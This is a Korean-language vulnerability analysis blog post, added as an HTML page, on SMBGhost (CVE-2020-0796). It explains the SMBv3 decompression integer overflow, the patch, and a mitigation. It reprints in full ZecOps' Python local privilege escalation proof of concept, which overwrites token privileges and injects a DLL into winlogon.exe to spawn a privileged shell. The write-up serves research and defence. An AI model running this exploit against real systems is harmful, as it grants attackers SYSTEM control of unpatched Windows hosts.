@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>SMBGhost | Core-Research-Team</title>
+<meta name="generator" content="Jekyll v4.0.1" />
+<meta property="og:title" content="SMBGhost" />
+<meta name="author" content="dmkim@raoncorp.com" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="라온화이트햇 핵심연구팀 김동민(dmkim@raoncorp.com)" />
+<meta property="og:description" content="라온화이트햇 핵심연구팀 김동민(dmkim@raoncorp.com)" />
+<link rel="canonical" href="http://localhost:4000/2020-04-01/SMBGhost" />
+<meta property="og:url" content="http://localhost:4000/2020-04-01/SMBGhost" />
+<meta property="og:site_name" content="Core-Research-Team" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-01T00:00:00+00:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","author":{"@type":"Person","name":"dmkim@raoncorp.com"},"url":"http://localhost:4000/2020-04-01/SMBGhost","headline":"SMBGhost","dateModified":"2020-04-01T00:00:00+00:00","datePublished":"2020-04-01T00:00:00+00:00","description":"라온화이트햇 핵심연구팀 김동민(dmkim@raoncorp.com)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-04-01/SMBGhost"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />
+
+  <!-- Google Analytics-->
+  
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">RAON - Core Research Team</h2>
+    </a>
+    <ul>
+      <li><a href="/about">About</a></li>
+      <li><a href="/">Posts</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post"> 
+	<h1 class="post-title">SMBGhost</h1>
+	<div class="post-line"></div>
+
+	
+		
+			
+				<span class="tag"><center><i>CVE</i></center></span>
+			
+		
+			
+				<span class="tag"><center><i>Research</i></center></span>
+			
+		
+	
+
+	<p>라온화이트햇 핵심연구팀 김동민(<a href="mailto:dmkim@raoncorp.com">dmkim@raoncorp.com</a>)</p>
+
+<h2 id="소개">소개</h2>
+
+<p>SMBGhost : CVE-2020-0796</p>
+
+<p>현재 공개된 RCE PoC는 없음, 그러나 LPE PoC 는 있음
+-&gt; RCE가 공개 될 경우, 스크립트 키디나 사이버 범죄자로부터 사회적 파급력을 고려하여 공개하지 않기로 결정. (약 48000대의 PC 노출)</p>
+
+<p>영향도 : Windows 10, server 2016 (v1903 및 v1909)</p>
+
+<p><img src="/assets/ca8b0633-25c0-4775-b98d-abaa573a80aa/23409f90-577a-4c9b-8c5c-ac109e5b854e.png" alt="/assets/ca8b0633-25c0-4775-b98d-abaa573a80aa/23409f90-577a-4c9b-8c5c-ac109e5b854e.png" /></p>
+
+<p>Kryptos Logic의 Marcus Hutchins 연구원이 여러 PoC를 공개함.</p>
+
+<p>인증되지 않은 공격자가 특수하게 조작된 패킷을 구성해 SMBv3 서버로 요청.
+Windows 10 버전 1903에 추가 된 새로운 기능(SMBv3 - 압축)</p>
+
+<h2 id="배경지식">배경지식</h2>
+
+<p>SMBv3 부터 새로 추가된 압축 및 해제 관련 구조체</p>
+
+<p><img src="/assets/2e230da0-a66b-415f-a56c-a4ce0f1f2310/a1b26d28-8f7b-4262-9d28-3905ee6fcb7d.png" alt="/assets/2e230da0-a66b-415f-a56c-a4ce0f1f2310/a1b26d28-8f7b-4262-9d28-3905ee6fcb7d.png" /></p>
+
+<h2 id="버그">버그</h2>
+
+<p>bug : srv2.sys!Srv2DecompressData - Integer Overflow
+SMB2_Compression_Transform_Header 에서 OriginalSize, Offset 조작하여 Integer Overflow 발생</p>
+
+<p>발생위치 : add ecx, eax ; OriginalSize + Offset (in srv2.sys!Srv2DecompressData)
+이후 계산된 (조작된)버퍼크기를 SrvNetAllocateBuffer 함수로 전달하여 버퍼를 할당.</p>
+
+<p><img src="/assets/43890ef7-d6a0-404b-87e8-8e6dedd43a2d/cae33f4b-81e9-46a1-8c9d-b10847bef027.png" alt="/assets/43890ef7-d6a0-404b-87e8-8e6dedd43a2d/cae33f4b-81e9-46a1-8c9d-b10847bef027.png" /></p>
+
+<p>RtlDecompressBufferXpressLz 함수를 통해 오버플로우된 데이터를 확인할 수 있음.</p>
+
+<p><img src="/assets/c84373bd-ff68-452a-965a-889380182a46/136ad7b6-6a43-4be1-9199-442e16ee7c26.png" alt="/assets/c84373bd-ff68-452a-965a-889380182a46/136ad7b6-6a43-4be1-9199-442e16ee7c26.png" /></p>
+
+<p>Wireshark 패킷 캡처 (4294967295 → 0xffffffff)</p>
+
+<p><img src="/assets/e023ce58-1b21-4137-82fc-efb2246350fc/ed07a9d0-665a-4966-b3ab-c7118898723f.png" alt="/assets/e023ce58-1b21-4137-82fc-efb2246350fc/ed07a9d0-665a-4966-b3ab-c7118898723f.png" /></p>
+
+<ul>
+  <li>call stack</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffff9480`20e2ad98  nt!RtlDecompressBufferXpressLz+0x2d0
+ffff9480`20e2adb0  nt!RtlDecompressBufferEx2+0x66
+ffff9480`20e2ae00  srvnet!SmbCompressionDecompress+0xd8
+ffff9480`20e2ae70  srv2!Srv2DecompressData+0xdc
+</code></pre></div></div>
+
+<p>-&gt; nt!RtlDecompressBufferXpressLz 함수에서 버퍼 할당을 하며 최종적으로 Integer Overflow 에서 Buffer Overflow 로 발전.</p>
+
+<p><img src="/assets/92494741-0475-46e7-ae99-94d8c6f50187/95b8d163-d7a5-4b44-aebc-c3330f141735.png" alt="/assets/92494741-0475-46e7-ae99-94d8c6f50187/95b8d163-d7a5-4b44-aebc-c3330f141735.png" /></p>
+
+<p><img src="/assets/7e2fdcfc-1e14-48bf-8281-02b690c663b0/f6cf5ff3-1f03-4233-a02f-333bc0da6ab8.png" alt="/assets/7e2fdcfc-1e14-48bf-8281-02b690c663b0/f6cf5ff3-1f03-4233-a02f-333bc0da6ab8.png" /></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p><img src="/assets/5520bbff-5dec-4aed-89b1-8b423c2c06ad/d92bc102-b9b1-4951-9a27-0a00de7ec043.png" alt="/assets/5520bbff-5dec-4aed-89b1-8b423c2c06ad/d92bc102-b9b1-4951-9a27-0a00de7ec043.png" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># CVE-2020-0796 Local Privilege Escalation POC
+# (c) 2020 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
+# Intended only for educational and testing in corporate environments.
+# ZecOps takes no responsibility for the code, use at your own risk.
+# Based on the work of Alexandre Beaulieu:
+# https://gist.github.com/alxbl/2fb9a0583c5b88db2b4d1a7f2ca5cdda
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">pathlib</span>
+
+<span class="kn">from</span> <span class="nn">write_what_where</span> <span class="kn">import</span> <span class="n">write_what_where</span>
+
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">ctypes.wintypes</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Shorthands for some ctypes stuff.
+</span><span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span>
+<span class="n">ntdll</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">ntdll</span>
+<span class="n">psapi</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">psapi</span>
+<span class="n">advapi32</span> <span class="o">=</span> <span class="n">windll</span><span class="p">.</span><span class="n">advapi32</span>
+<span class="n">OpenProcessToken</span> <span class="o">=</span> <span class="n">advapi32</span><span class="p">.</span><span class="n">OpenProcessToken</span>
+
+<span class="c1"># Constants.
+</span><span class="n">STATUS_SUCCESS</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">STATUS_INFO_LENGTH_MISMATCH</span> <span class="o">=</span> <span class="mh">0xC0000004</span>
+<span class="n">STATUS_INVALID_HANDLE</span> <span class="o">=</span> <span class="mh">0xC0000008</span>
+<span class="n">TOKEN_QUERY</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">SystemExtendedHandleInformation</span> <span class="o">=</span> <span class="mi">64</span>
+
+<span class="n">NTSTATUS</span> <span class="o">=</span> <span class="n">DWORD</span>
+<span class="n">PHANDLE</span> <span class="o">=</span> <span class="n">POINTER</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span>
+<span class="n">PVOID</span> <span class="o">=</span> <span class="n">LPVOID</span> <span class="o">=</span> <span class="n">ULONG_PTR</span> <span class="o">=</span> <span class="n">c_void_p</span>
+
+<span class="c1"># Function signature helpers.
+</span><span class="n">ntdll</span><span class="p">.</span><span class="n">NtQuerySystemInformation</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">POINTER</span><span class="p">(</span><span class="n">ULONG</span><span class="p">)]</span>
+<span class="n">ntdll</span><span class="p">.</span><span class="n">NtQuerySystemInformation</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">NTSTATUS</span>
+
+<span class="n">advapi32</span><span class="p">.</span><span class="n">OpenProcessToken</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span> <span class="p">,</span> <span class="n">POINTER</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)]</span>
+<span class="n">advapi32</span><span class="p">.</span><span class="n">OpenProcessToken</span><span class="p">.</span><span class="n">restype</span>  <span class="o">=</span> <span class="n">BOOL</span>
+
+<span class="c1"># Structures for NtQuerySystemInformation.
+</span><span class="k">class</span> <span class="nc">SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span><span class="p">(</span><span class="n">Structure</span><span class="p">):</span>
+    <span class="n">_fields_</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">(</span><span class="s">"Object"</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"UniqueProcessId"</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"HandleValue"</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"GrantedAccess"</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"CreatorBackTraceIndex"</span><span class="p">,</span> <span class="n">USHORT</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"ObjectTypeIndex"</span><span class="p">,</span> <span class="n">USHORT</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"HandleAttributes"</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"Reserved"</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">),</span>
+    <span class="p">]</span>
+<span class="k">class</span> <span class="nc">SYSTEM_HANDLE_INFORMATION_EX</span><span class="p">(</span><span class="n">Structure</span><span class="p">):</span>
+    <span class="n">_fields_</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">(</span><span class="s">"NumberOfHandles"</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"Reserved"</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">),</span>
+        <span class="p">(</span><span class="s">"Handles"</span><span class="p">,</span> <span class="n">SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span> <span class="o">*</span> <span class="mi">1</span><span class="p">),</span>
+    <span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">find_handles</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="s">"""
+    Parses the output of NtQuerySystemInformation to find handles associated
+    with the given PID.
+    """</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="n">cast</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">POINTER</span><span class="p">(</span><span class="n">SYSTEM_HANDLE_INFORMATION_EX</span><span class="p">))</span>
+    <span class="n">nentries</span> <span class="o">=</span> <span class="n">header</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">NumberOfHandles</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Leaking access token address'</span><span class="p">)</span>
+
+    <span class="n">handles</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
+
+    <span class="c1"># Manually unpacking the struct because of issues with ctypes.parse
+</span>    <span class="k">while</span> <span class="n">nentries</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">40</span><span class="p">]</span>
+        <span class="n">e</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;QQQLHHLL'</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+        <span class="n">nentries</span> <span class="o">-=</span> <span class="mi">1</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">40</span><span class="p">:]</span>
+        <span class="n">hpid</span> <span class="o">=</span> <span class="n">e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">handle</span> <span class="o">=</span> <span class="n">e</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+        <span class="k">if</span> <span class="n">hpid</span> <span class="o">!=</span> <span class="n">pid</span><span class="p">:</span> <span class="k">continue</span>
+        <span class="n">handles</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">e</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">e</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">e</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+
+    <span class="k">return</span> <span class="n">handles</span>
+
+<span class="k">def</span> <span class="nf">get_token_address</span><span class="p">():</span>
+    <span class="s">"""
+    Leverage userland APIs to leak the current process' token address in kernel
+    land.
+    """</span>
+    <span class="n">hProc</span> <span class="o">=</span> <span class="n">HANDLE</span><span class="p">(</span><span class="n">kernel32</span><span class="p">.</span><span class="n">GetCurrentProcess</span><span class="p">())</span>
+    <span class="n">pid</span> <span class="o">=</span> <span class="n">kernel32</span><span class="p">.</span><span class="n">GetCurrentProcessId</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Current PID: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
+
+    <span class="n">h</span> <span class="o">=</span> <span class="n">HANDLE</span><span class="p">()</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="n">byref</span><span class="p">(</span><span class="n">h</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[-] Error getting token handle: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">kernel32</span><span class="p">.</span><span class="n">GetLastError</span><span class="p">()))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Token Handle: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">value</span><span class="p">))</span>
+
+    <span class="c1"># Find the handles associated with the current process
+</span>    <span class="n">q</span> <span class="o">=</span> <span class="n">STATUS_INFO_LENGTH_MISMATCH</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">DWORD</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">sz</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">q</span> <span class="o">==</span> <span class="n">STATUS_INFO_LENGTH_MISMATCH</span><span class="p">:</span>
+        <span class="n">sz</span> <span class="o">+=</span> <span class="mh">0x1000</span>
+        <span class="n">handle_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">c_ubyte</span> <span class="o">*</span> <span class="n">sz</span><span class="p">)()</span>
+        <span class="n">q</span> <span class="o">=</span> <span class="n">ntdll</span><span class="p">.</span><span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemExtendedHandleInformation</span><span class="p">,</span> <span class="n">byref</span><span class="p">(</span><span class="n">handle_info</span><span class="p">),</span> <span class="n">sz</span><span class="p">,</span> <span class="n">byref</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+
+    <span class="c1"># Parse handle_info to retrieve handles for the current PID
+</span>    <span class="n">handles</span> <span class="o">=</span> <span class="n">find_handles</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">handle_info</span><span class="p">)</span>
+    <span class="n">hToken</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">pid</span> <span class="ow">and</span> <span class="n">x</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">h</span><span class="p">.</span><span class="n">value</span><span class="p">,</span> <span class="n">handles</span><span class="p">))</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">hToken</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[-] Could not find access token address!'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">pToken</span> <span class="o">=</span> <span class="n">hToken</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">'[+] Found token at '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pToken</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">pToken</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="s">"""
+    Exploits the bug to escalate privileges.
+    Reminder:
+    0: kd&gt; dt nt!_SEP_TOKEN_PRIVILEGES
+       +0x000 Present          : Uint8B
+       +0x008 Enabled          : Uint8B
+       +0x010 EnabledByDefault : Uint8B
+    """</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">get_token_address</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">token</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">what</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\xFF</span><span class="s">'</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">3</span>
+    <span class="n">where</span> <span class="o">=</span> <span class="n">token</span> <span class="o">+</span> <span class="mh">0x40</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Writing full privileges on address %x'</span> <span class="o">%</span> <span class="p">(</span><span class="n">where</span><span class="p">))</span>
+
+    <span class="n">write_what_where</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] All done! Spawning a privileged shell.'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'[+] Check your privileges: !token %x'</span> <span class="o">%</span> <span class="p">(</span><span class="n">token</span><span class="p">))</span>
+
+    <span class="n">dll_path</span> <span class="o">=</span> <span class="n">pathlib</span><span class="p">.</span><span class="n">Path</span><span class="p">(</span><span class="n">__file__</span><span class="p">).</span><span class="n">parent</span><span class="p">.</span><span class="n">absolute</span><span class="p">().</span><span class="n">joinpath</span><span class="p">(</span><span class="s">'spawn_cmd.dll'</span><span class="p">)</span>
+    <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">([</span><span class="s">'Injector.exe'</span><span class="p">,</span> <span class="s">'--process-name'</span><span class="p">,</span> <span class="s">'winlogon.exe'</span><span class="p">,</span> <span class="s">'--inject'</span><span class="p">,</span> <span class="n">dll_path</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">exploit</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="패치내용">패치내용</h2>
+
+<p>패치 전</p>
+
+<p><img src="/assets/7542c932-c7dc-4efb-b0af-6145d1b23a85/f23e3771-1917-47ae-9d47-0b574a2a4d6b.png" alt="/assets/7542c932-c7dc-4efb-b0af-6145d1b23a85/f23e3771-1917-47ae-9d47-0b574a2a4d6b.png" /></p>
+
+<p>패치 후</p>
+
+<ul>
+  <li>Srv2DecompressData 에서 두 헤더(OriginalSize, Offset)의 길이를 검사하는 루틴 추가.</li>
+</ul>
+
+<p><img src="/assets/67ad6e02-3410-460b-b2eb-8c177bfdbe8b/22e350cc-ca35-47e9-8898-f84225ce7412.png" alt="/assets/67ad6e02-3410-460b-b2eb-8c177bfdbe8b/22e350cc-ca35-47e9-8898-f84225ce7412.png" /></p>
+
+<h2 id="대응방안">대응방안</h2>
+
+<p>SMBv3 압축을 비활성화 할 것을 권장</p>
+
+<ul>
+  <li>PowerShell (Administrator) 실행</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters"</span><span class="w"> </span><span class="nx">DisableCompression</span><span class="w"> </span><span class="nt">-Type</span><span class="w"> </span><span class="nx">DWORD</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="마치며">마치며</h2>
+
+<p><code class="highlighter-rouge">서버 취약점</code> srv2.sys
+<code class="highlighter-rouge">클라이언트 취약점</code> mrxsmb.sys
+-&gt; 서버, 클라이언트 모두 같은 코드를 가지고 있음. 즉, 서버-클라이언트 모두 동일한 취약한 코드 실행가능 (웜 형태로 전파 가능)</p>
+
+<p>Kernel ASLR 또는 KASLR과 같은 Windows의 최신 보호기법을 우회하려면 추가 버그가 필요할 수 있기 때문에, 원격 코드 실행에서 완전한 원격 코드 실행으로 전환하는 것은 어려운것으로 판단.</p>
+
+<h2 id="reference">Reference</h2>
+
+<ul>
+  <li><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></li>
+  <li><a href="https://github.com/ZecOps/CVE-2020-0796-LPE-POC">https://github.com/ZecOps/CVE-2020-0796-LPE-POC</a></li>
+  <li><a href="https://medium.com/@knownsec404team/cve-2020-0796-windows-smbv3-lpe-exploit-poc-analysis-c77569124c87">https://medium.com/@knownsec404team/cve-2020-0796-windows-smbv3-lpe-exploit-poc-analysis-c77569124c87</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/48267">https://www.exploit-db.com/exploits/48267</a></li>
+  <li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a></li>
+  <li><a href="https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html">https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html</a></li>
+  <li><a href="https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html#.Xndfn0lv150.twitter">https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html#.Xndfn0lv150.twitter</a></li>
+  <li><a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/smbghost-analysis-of-cve-2020-0796/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/smbghost-analysis-of-cve-2020-0796/</a></li>
+  <li><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></li>
+</ul>
+
+	</div>
+</div>
+
+
+  <!-- Start disqus 
+<script src="/assets/js/disqusLoader.js" /></script>
+<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
+<div class="disqus"></div>
+<script>
+    disqusLoader('.disqus', {
+        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
+    });
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+End disqus -->
+
+
+<div class="pagination">
+  
+	<a href="/2020-04-01/hw-interrupt" class="left arrow">&#8592;</a>
+  
+  
+	<a href="/2020-04-01/Plaid-CTF-Mojo" class="right arrow">&#8594;</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+    </main>
+
+    <!--footer>
+  <span>
+    &copy; <time datetime="2020-07-14 07:51:51 +0000">2020</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span>
+</footer-->
+
+  </body>
+</html>
